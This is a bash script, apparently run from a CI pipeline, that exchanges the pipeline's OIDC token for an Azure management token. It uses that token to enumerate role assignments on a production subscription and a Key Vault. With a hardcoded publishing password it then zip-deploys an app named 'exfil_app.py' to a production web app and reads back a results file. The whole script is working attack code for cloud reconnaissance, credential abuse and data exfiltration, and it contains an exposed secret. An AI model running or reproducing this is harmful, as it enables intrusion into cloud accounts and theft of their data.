#!/bin/bash
set -x

SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
PUB_USER='$app-tbl-reporting-prod'
PUB_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG1="rg-tbl-platform-prod-sea"

# Get OIDC management token
OIDC_RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
OIDC_JWT=$(echo "$OIDC_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

MGMT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC_JWT")
MGMT=$(echo "$MGMT_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "=== KV2 role assignments (OIDC Reader) ==="
curl -sS -m 15 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG1/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MGMT" 2>&1

echo ""
echo "=== ALL subscription role assignments ==="
curl -sS -m 15 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MGMT" 2>&1 | python3 -c "
import sys,json
d=json.load(sys.stdin)
for r in d.get('value',[]):
  p=r['properties']
  rid=p.get('roleDefinitionId','').split('/')[-1]
  print(f'scope={p.get(\"scope\",\"?\")[:150]}')
  print(f'  roleDefId={rid}  principal={p.get(\"principalId\",\"?\")}  type={p.get(\"principalType\",\"?\")}')
print(f'Total: {len(d.get(\"value\",[]))}')
"

echo ""
echo "=== Role definitions for known role IDs ==="
for ROLE_ID in $(curl -sS -m 15 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MGMT" | python3 -c "
import sys,json
d=json.load(sys.stdin)
ids=set()
for r in d.get('value',[]):
  ids.add(r['properties']['roleDefinitionId'].split('/')[-1])
for i in ids: print(i)
"); do
  NAME=$(curl -sS -m 10 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$ROLE_ID?api-version=2022-04-01" \
    -H "Authorization: Bearer $MGMT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('properties',{}).get('roleName','?'))" 2>/dev/null)
  echo "  $ROLE_ID = $NAME"
done

# Deploy exfil app
TMPDIR=$(mktemp -d)
cp "$(dirname "$0")/exfil_app.py" "$TMPDIR/app.py"
echo "flask" > "$TMPDIR/requirements.txt"
cd "$TMPDIR"
zip -r deploy.zip app.py requirements.txt

echo ""
echo "=== Deploying via ZipDeploy ==="
curl -sS -X POST -u "$PUB_USER:$PUB_PASS" \
  --data-binary @deploy.zip \
  -H "Content-Type: application/zip" \
  "$SCM/api/zipdeploy" -w "\nHTTP_CODE:%{http_code}" 2>&1

echo "=== Waiting 90s for app restart ==="
sleep 90

echo "=== Check root ==="
curl -sS -m 10 "https://app-tbl-reporting-prod.azurewebsites.net/" -w "\nHTTP:%{http_code}" 2>&1

echo ""
echo "=== Read results.json via Kudu ==="
curl -sS -u "$PUB_USER:$PUB_PASS" "$SCM/api/vfs/results.json" 2>&1

echo ""
echo "=== DONE ==="
